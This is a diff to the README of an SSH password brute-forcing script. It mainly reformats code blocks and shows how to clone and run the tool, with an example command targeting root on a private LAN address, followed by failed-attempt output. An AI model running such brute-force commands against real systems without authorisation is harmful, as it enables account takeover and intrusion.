@@ -1,11 +1,11 @@
 # SSH_Bruteforce
 #### 获取脚本
 
-`git clone https://github.com/HZzz2/SSH_Bruteforce`
+```git clone https://github.com/HZzz2/SSH_Bruteforce```
 
 #### 进入目录
 
-`cd SSH_Bruteforce`
+```cd SSH_Bruteforce```
 
 #### 获取帮助
 
@@ -35,6 +35,8 @@ optional arguments:
 
 ```Bash
 python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
+```
+```
 [-] 11 is not correct
 [-] 44 is not correct
 [-] 88 is not correct
